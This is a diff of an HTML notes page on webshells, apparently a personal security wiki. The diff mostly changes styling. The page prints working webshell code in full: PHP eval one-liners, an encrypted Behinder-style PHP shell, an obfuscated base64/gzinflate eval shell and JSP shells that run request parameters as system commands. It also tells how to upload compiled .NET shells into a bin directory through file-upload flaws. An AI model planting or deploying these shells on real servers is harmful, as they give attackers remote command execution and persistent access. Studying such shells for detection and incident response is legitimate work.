@@ -1,23 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-12-03 Sun 16:50 -->
+<!-- 2024-01-07 Sun 22:10 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Webshell</title>
 <meta name="author" content="Honbey Zhang" />
 <meta name="generator" content="Org Mode" />
-
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
-                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
 </head>
 <body>
 <div id="content" class="content">
@@ -27,26 +16,26 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org5f171ac">PHP Webshell</a></li>
-<li><a href="#org57f6d01">JSP Webshell</a></li>
-<li><a href="#orgf8bccd7">ASP Webshell</a>
+<li><a href="#org3e7806a">PHP Webshell</a></li>
+<li><a href="#orgdb1d786">JSP Webshell</a></li>
+<li><a href="#orge756ba1">ASP Webshell</a>
 <ul>
-<li><a href="#org396e9e2">Find Vulnerabilities / Code Audit</a></li>
-<li><a href="#org0b3c979">Global.asax</a></li>
-<li><a href="#orgcf23041">ILSpy</a></li>
+<li><a href="#org35074a0">Find Vulnerabilities / Code Audit</a></li>
+<li><a href="#orgb67e329">Global.asax</a></li>
+<li><a href="#org06ee8f8">ILSpy</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </nav>
-<div id="outline-container-org5f171ac" class="outline-2">
-<h2 id="org5f171ac">PHP Webshell</h2>
-<div class="outline-text-2" id="text-org5f171ac">
+<div id="outline-container-org3e7806a" class="outline-2">
+<h2 id="org3e7806a">PHP Webshell</h2>
+<div class="outline-text-2" id="text-org3e7806a">
 <p>
 一句话木马：
 </p>
 <div class="org-src-container">
-<pre class="src src-php">&lt;?php eval($_POST["pass"]);?&gt;
+<pre class="src src-php"><span style="color: #006FE0; background-color: #FFFFFF;">&lt;?php</span> eval<span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">_POST</span><span style="color: #7388D6; background-color: #FFFFFF;">[</span>"<span style="color: #008000;">pass</span>"<span style="color: #7388D6; background-color: #FFFFFF;">]</span><span style="color: #707183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span><span style="color: #006FE0; background-color: #FFFFFF;">?&gt;</span>
 </pre>
 </div>
 
@@ -54,31 +43,31 @@
 冰蝎 PHP Webshell：
 </p>
 <div class="org-src-container">
-<pre class="src src-php">&lt;?php
-session_start();
-if (isset($_GET['pass'])) {
-    $key = substr(md5(uniqid(rand())),16);
-    $_SESSION['k'] = $key;
-    print $key;
-} else {
-    $key = $_SESSION['k'];
-    $post = file_get_contents("php://input");
-    if(!extension_loaded('openssl')) {
-        $t = "base64_"."decode";
-        $post = $t($post."");
-        for($i = 0; $i &lt; strlen($post); $i++) {
-            $post[$i] = $post[$i]^$key[$i+1&amp;15];
-        }
-    } else {
-        $post = openssl_decrypt($post, "AES128", $key);
-    }
-    $arr = explode('|',$post);
-    $func = $arr[0];
-    $params = $arr[1];
-    class C{public function __construct($p) {eval($p."");}}
-    @new C($params);
-}
-?&gt;
+<pre class="src src-php"><span style="color: #006FE0; background-color: #FFFFFF;">&lt;?php</span>
+session_start<span style="color: #707183; background-color: #FFFFFF;">()</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+if <span style="color: #707183; background-color: #FFFFFF;">(</span>isset<span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">_GET</span><span style="color: #909183; background-color: #FFFFFF;">[</span><span style="color: #008000;">'pass'</span><span style="color: #909183; background-color: #FFFFFF;">]</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #707183; background-color: #FFFFFF;">)</span> <span style="color: #707183; background-color: #FFFFFF;">{</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">key</span> <span style="color: #0000FF;">=</span> substr<span style="color: #7388D6; background-color: #FFFFFF;">(</span>md5<span style="color: #909183; background-color: #FFFFFF;">(</span>uniqid<span style="color: #709870; background-color: #FFFFFF;">(</span>rand<span style="color: #707183; background-color: #FFFFFF;">()</span><span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">,</span><span style="color: #D0372D;">16</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">_SESSION</span><span style="color: #7388D6; background-color: #FFFFFF;">[</span><span style="color: #008000;">'k'</span><span style="color: #7388D6; background-color: #FFFFFF;">]</span> <span style="color: #0000FF;">=</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">key</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    print <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">key</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #707183; background-color: #FFFFFF;">}</span> else <span style="color: #707183; background-color: #FFFFFF;">{</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">key</span> <span style="color: #0000FF;">=</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">_SESSION</span><span style="color: #7388D6; background-color: #FFFFFF;">[</span><span style="color: #008000;">'k'</span><span style="color: #7388D6; background-color: #FFFFFF;">]</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span> <span style="color: #0000FF;">=</span> file_get_contents<span style="color: #7388D6; background-color: #FFFFFF;">(</span>"<span style="color: #008000;">php://input</span>"<span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    if<span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">!</span>extension_loaded<span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #008000;">'openssl'</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span> <span style="color: #7388D6; background-color: #FFFFFF;">{</span>
+        <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">t</span> <span style="color: #0000FF;">=</span> "<span style="color: #008000;">base64_</span>"<span style="color: #333333; background-color: #FFFFFF;">.</span>"<span style="color: #008000;">decode</span>"<span style="color: #333333; background-color: #FFFFFF;">;</span>
+        <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span> <span style="color: #0000FF;">=</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">t</span><span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span><span style="color: #333333; background-color: #FFFFFF;">.</span>""<span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+        for<span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span> <span style="color: #0000FF;">&lt;</span> strlen<span style="color: #709870; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span><span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #0000FF;">++</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #909183; background-color: #FFFFFF;">{</span>
+            <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span><span style="color: #709870; background-color: #FFFFFF;">[</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #709870; background-color: #FFFFFF;">]</span> <span style="color: #0000FF;">=</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span><span style="color: #709870; background-color: #FFFFFF;">[</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #709870; background-color: #FFFFFF;">]</span>^<span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">key</span><span style="color: #709870; background-color: #FFFFFF;">[</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #0000FF;">+</span><span style="color: #D0372D;">1</span><span style="color: #0000FF;">&amp;</span><span style="color: #D0372D;">15</span><span style="color: #709870; background-color: #FFFFFF;">]</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+        <span style="color: #909183; background-color: #FFFFFF;">}</span>
+    <span style="color: #7388D6; background-color: #FFFFFF;">}</span> else <span style="color: #7388D6; background-color: #FFFFFF;">{</span>
+        <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span> <span style="color: #0000FF;">=</span> openssl_decrypt<span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span><span style="color: #333333; background-color: #FFFFFF;">,</span> "<span style="color: #008000;">AES128</span>"<span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">key</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    <span style="color: #7388D6; background-color: #FFFFFF;">}</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">arr</span> <span style="color: #0000FF;">=</span> explode<span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #008000;">'|'</span><span style="color: #333333; background-color: #FFFFFF;">,</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">post</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">func</span> <span style="color: #0000FF;">=</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">arr</span><span style="color: #7388D6; background-color: #FFFFFF;">[</span><span style="color: #D0372D;">0</span><span style="color: #7388D6; background-color: #FFFFFF;">]</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">params</span> <span style="color: #0000FF;">=</span> <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">arr</span><span style="color: #7388D6; background-color: #FFFFFF;">[</span><span style="color: #D0372D;">1</span><span style="color: #7388D6; background-color: #FFFFFF;">]</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    <span style="color: #0000FF;">class</span> <span style="color: #6434A3;">C</span><span style="color: #7388D6; background-color: #FFFFFF;">{</span><span style="color: #0000FF;">public</span> function <span style="color: #006699;">__construct</span><span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">p</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #909183; background-color: #FFFFFF;">{</span>eval<span style="color: #709870; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">p</span><span style="color: #333333; background-color: #FFFFFF;">.</span>""<span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span><span style="color: #909183; background-color: #FFFFFF;">}</span><span style="color: #7388D6; background-color: #FFFFFF;">}</span>
+    @<span style="color: #0000FF;">new</span> <span style="color: #6434A3;">C</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">params</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #707183; background-color: #FFFFFF;">}</span>
+<span style="color: #006FE0; background-color: #FFFFFF;">?&gt;</span>
 </pre>
 </div>
 
@@ -86,27 +75,27 @@ if (isset($_GET['pass'])) {
 带混淆的 PHP Webshell
 </p>
 <div class="org-src-container">
-<pre class="src src-php">&lt;?php
-function iJG($BHM) {
-  $BHM=gzinflate(base64_decode($BHM));
-  for($i=0;$i&lt;strlen($BHM);$i++) {
-    $BHM[$i] = chr(ord($BHM[$i])-1);
-  }
-   return $BHM;
- } eval(iJG("U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A"));
-?&gt;
+<pre class="src src-php"><span style="color: #006FE0; background-color: #FFFFFF;">&lt;?php</span>
+function <span style="color: #006699;">iJG</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">BHM</span><span style="color: #707183; background-color: #FFFFFF;">)</span> <span style="color: #707183; background-color: #FFFFFF;">{</span>
+  <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">BHM</span><span style="color: #0000FF;">=</span>gzinflate<span style="color: #7388D6; background-color: #FFFFFF;">(</span>base64_decode<span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">BHM</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+  for<span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #0000FF;">&lt;</span>strlen<span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">BHM</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #0000FF;">++</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span> <span style="color: #7388D6; background-color: #FFFFFF;">{</span>
+    <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">BHM</span><span style="color: #909183; background-color: #FFFFFF;">[</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #909183; background-color: #FFFFFF;">]</span> <span style="color: #0000FF;">=</span> chr<span style="color: #909183; background-color: #FFFFFF;">(</span>ord<span style="color: #709870; background-color: #FFFFFF;">(</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">BHM</span><span style="color: #707183; background-color: #FFFFFF;">[</span><span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">i</span><span style="color: #707183; background-color: #FFFFFF;">]</span><span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #0000FF;">-</span><span style="color: #D0372D;">1</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+  <span style="color: #7388D6; background-color: #FFFFFF;">}</span>
+   return <span style="color: #BA36A5;">$</span><span style="color: #BA36A5;">BHM</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+ <span style="color: #707183; background-color: #FFFFFF;">}</span> eval<span style="color: #707183; background-color: #FFFFFF;">(</span>iJG<span style="color: #7388D6; background-color: #FFFFFF;">(</span>"<span style="color: #008000;">U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A</span>"<span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #707183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #006FE0; background-color: #FFFFFF;">?&gt;</span>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org57f6d01" class="outline-2">
-<h2 id="org57f6d01">JSP Webshell</h2>
-<div class="outline-text-2" id="text-org57f6d01">
+<div id="outline-container-orgdb1d786" class="outline-2">
+<h2 id="orgdb1d786">JSP Webshell</h2>
+<div class="outline-text-2" id="text-orgdb1d786">
 <p>
 一句话木马：
 </p>
 <div class="org-src-container">
-<pre class="src src-java">&lt;%Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>));%&gt;
+<pre class="src src-java">&lt;%Runtime.getRuntime<span style="color: #707183;">()</span>.exec<span style="color: #707183;">(</span>request.getParameter<span style="color: #7388D6;">(</span><span style="color: #008000;">"pass"</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span>;%&gt;
 </pre>
 </div>
 
@@ -115,22 +104,22 @@ function iJG($BHM) {
 </p>
 <div class="org-src-container">
 <pre class="src src-java">&lt;%
-    <span style="color: #D0372D;">java</span>.<span style="color: #D0372D;">io</span>.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>)).getInputStream();
+    <span style="color: #D0372D;">java</span>.<span style="color: #D0372D;">io</span>.InputStream in = Runtime.getRuntime<span style="color: #707183;">()</span>.exec<span style="color: #707183;">(</span>request.getParameter<span style="color: #7388D6;">(</span><span style="color: #008000;">"pass"</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span>.getInputStream<span style="color: #707183;">()</span>;
     <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">a</span> = -<span style="color: #D0372D;">1</span>;
-    <span style="color: #6434A3;">byte</span>[] <span style="color: #BA36A5;">b</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">byte</span>[<span style="color: #D0372D;">2048</span>];
-    out.print(<span style="color: #008000;">"&lt;pre&gt;"</span>);
-    <span style="color: #0000FF;">while</span>((a=in.read(b))!=-<span style="color: #D0372D;">1</span>){
-        out.println(<span style="color: #0000FF;">new</span> <span style="color: #6434A3;">String</span>(b));
-    }
-    out.print(<span style="color: #008000;">"&lt;/pre&gt;"</span>);
+    <span style="color: #6434A3;">byte</span><span style="color: #707183;">[]</span> <span style="color: #BA36A5;">b</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">byte</span><span style="color: #707183;">[</span><span style="color: #D0372D;">2048</span><span style="color: #707183;">]</span>;
+    out.print<span style="color: #707183;">(</span><span style="color: #008000;">"&lt;pre&gt;"</span><span style="color: #707183;">)</span>;
+    <span style="color: #0000FF;">while</span><span style="color: #707183;">(</span><span style="color: #7388D6;">(</span>a=in.read<span style="color: #909183;">(</span>b<span style="color: #909183;">)</span><span style="color: #7388D6;">)</span>!=-<span style="color: #D0372D;">1</span><span style="color: #707183;">){</span>
+        out.println<span style="color: #7388D6;">(</span><span style="color: #0000FF;">new</span> <span style="color: #6434A3;">String</span><span style="color: #909183;">(</span>b<span style="color: #909183;">)</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #707183;">}</span>
+    out.print<span style="color: #707183;">(</span><span style="color: #008000;">"&lt;/pre&gt;"</span><span style="color: #707183;">)</span>;
 %&gt;
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-orgf8bccd7" class="outline-2">
-<h2 id="orgf8bccd7">ASP Webshell</h2>
-<div class="outline-text-2" id="text-orgf8bccd7">
+<div id="outline-container-orge756ba1" class="outline-2">
+<h2 id="orge756ba1">ASP Webshell</h2>
+<div class="outline-text-2" id="text-orge756ba1">
 <p>
 .NET 优先加载 bin 目录下的程序，例如 index.aspx -&gt; /bin/index.dll ，这时任意目录均能处理 index.aspx ，如果存在任意文件上传漏洞的话，就可以将编译好的 webshell 上传到 bin 目录。
 </p>
@@ -143,9 +132,9 @@ function iJG($BHM) {
 </pre>
 </div>
 </div>
-<div id="outline-container-org396e9e2" class="outline-3">
-<h3 id="org396e9e2">Find Vulnerabilities / Code Audit</h3>
-<div class="outline-text-3" id="text-org396e9e2">
+<div id="outline-container-org35074a0" class="outline-3">
+<h3 id="org35074a0">Find Vulnerabilities / Code Audit</h3>
+<div class="outline-text-3" id="text-org35074a0">
 <ol class="org-ol">
 <li>在得到安装包的情况下，用 ILSpy 反编译</li>
 <li>查找 Upload, File, Download 等关键词</li>
@@ -153,17 +142,17 @@ function iJG($BHM) {
 </ol>
 </div>
 </div>
-<div id="outline-container-org0b3c979" class="outline-3">
-<h3 id="org0b3c979">Global.asax</h3>
-<div class="outline-text-3" id="text-org0b3c979">
+<div id="outline-container-orgb67e329" class="outline-3">
+<h3 id="orgb67e329">Global.asax</h3>
+<div class="outline-text-3" id="text-orgb67e329">
 <p>
 文件说明<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>。
 </p>
 </div>
 </div>
-<div id="outline-container-orgcf23041" class="outline-3">
-<h3 id="orgcf23041">ILSpy</h3>
-<div class="outline-text-3" id="text-orgcf23041">
+<div id="outline-container-org06ee8f8" class="outline-3">
+<h3 id="org06ee8f8">ILSpy</h3>
+<div class="outline-text-3" id="text-org06ee8f8">
 <p>
 .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&amp;more) - cross-platform!<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
 </p>
@@ -217,13 +206,7 @@ Webshell 处置流程：
 </div>
 </div></div>
 <div id="postamble" class="status">
-
-                     Theme
-                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow</a>
-                     by
-                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
-                     <br>
-                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
 </div>
 </body>
 </html>
